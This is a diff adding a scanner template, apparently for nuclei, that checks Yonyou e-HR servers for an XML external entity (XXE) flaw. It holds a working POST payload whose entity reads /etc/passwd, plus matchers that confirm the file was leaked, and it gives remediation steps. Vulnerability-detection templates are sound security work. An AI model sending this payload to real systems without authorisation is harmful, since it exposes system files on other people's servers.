@@ -1,0 +1,40 @@
+id: yonyou_EHR-xxe-smartweb2
+info:
+  name: 用友e-HR系统XXE漏洞
+  author:
+  - 折跃
+  description: |-
+    用友e-HR XXE漏洞
+    用友e-HR，用友人力资源管理系统，是一款人力资源管理软件。
+
+    用友e-HR存在XXE漏洞，该漏洞源于程序没有正确的校验XML外部实体。
+  severity: high
+  remediation: |2-
+
+    官方修复方案：
+    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
+    https://www.yonyou.com/
+
+    临时修复方案：
+    1、禁用外部实体
+    2、过滤用户提交的XML数据，关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'__profileKeys')
+    - contains(body,'bin/bash')
+  path:
+  - '{{BaseURL}}/hrss/dorado/smartweb2.RPC.d?__rpc=true'
+  method: POST
+  body: __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE
+    z [<!ENTITY test  SYSTEM "file:///etc/passwd" >]><rpc transaction="10" method="resetPwd"><def><dataset
+    type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r
+    id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
